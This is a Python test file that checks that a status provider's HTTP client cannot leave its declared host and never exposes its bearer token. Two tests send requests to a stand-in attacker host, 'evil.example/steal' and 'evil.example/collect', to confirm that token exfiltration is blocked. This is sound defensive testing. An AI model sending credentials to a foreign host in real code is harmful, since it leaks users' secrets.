# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Mycelium Contributors

"""The two promises the ``ProviderContext`` makes, enforced rather than trusted.

``build_http_context`` is what finally makes the contract runnable: it hands a
provider a transport already bound to its declared host and already carrying its
credential. The contract only means something if a provider *cannot* step outside
either bound, so these prove it can't: a request to another host is refused
before it leaves the process, and the credential never surfaces on the context.
"""

from __future__ import annotations

from datetime import timedelta

import httpx
import pytest

from app.services.status.auth import Bearer
from app.services.status.context import (
    HostBoundError,
    _HostBoundTransport,
    build_http_context,
)


class _Provider:
    name = "github"
    base_url = "https://api.github.com"
    auth = Bearer("GITHUB_TOKEN")
    max_batch = 50
    ttl = timedelta(minutes=1)
    swr = timedelta(minutes=30)

    def claims(self, text: str):
        return []

    async def fetch(self, refs, ctx):
        return []


def _rendered(token: str) -> dict[str, str]:
    """What the runtime hands the factory: headers the scheme already rendered.

    The factory never sees a credential in any other shape, so neither do these.
    """
    return dict(_Provider.auth.headers({"GITHUB_TOKEN": token}))


def test_the_client_is_bound_to_the_declared_host_and_carries_the_token():
    ctx = build_http_context(_Provider(), _rendered("s3cret"))
    client = ctx.http
    assert str(client.base_url) == "https://api.github.com"
    # The token rides in the default headers; the provider is handed the client,
    # never the string, so there is no ctx.secret to read it back from.
    assert client.headers["Authorization"] == "Bearer s3cret"
    assert not hasattr(ctx, "secret")


def test_a_provider_declaring_no_credential_gets_an_unauthenticated_client():
    class Anon(_Provider):
        auth = None

    ctx = build_http_context(Anon(), None)
    assert "Authorization" not in ctx.http.headers


@pytest.mark.asyncio
async def test_a_request_to_another_host_is_refused_before_it_leaves_the_process():
    # The wrapped inner transport must never even be reached for a foreign host,
    # so it is one that would fail loudly if it were.
    class _Exploding(httpx.AsyncBaseTransport):
        async def handle_async_request(self, request):
            raise AssertionError("the foreign request should never reach the wire")

    transport = _HostBoundTransport(_Exploding(), "api.github.com")
    request = httpx.Request("GET", "https://evil.example/steal")
    with pytest.raises(HostBoundError):
        await transport.handle_async_request(request)


@pytest.mark.asyncio
async def test_a_request_to_the_declared_host_passes_through():
    sentinel = httpx.Response(204)

    class _Inner(httpx.AsyncBaseTransport):
        async def handle_async_request(self, request):
            return sentinel

    transport = _HostBoundTransport(_Inner(), "api.github.com")
    got = await transport.handle_async_request(
        httpx.Request("POST", "https://api.github.com/graphql")
    )
    assert got is sentinel


@pytest.mark.asyncio
async def test_an_absolute_url_to_a_foreign_host_cannot_carry_the_token_off():
    # The whole point of enforcing the host: a hand-written absolute URL (or a
    # redirect) to another host must not smuggle the Authorization header out.
    ctx = build_http_context(_Provider(), _rendered("s3cret"))
    with pytest.raises(HostBoundError):
        await ctx.http.post("https://evil.example/collect", json={})
    await ctx.aclose()
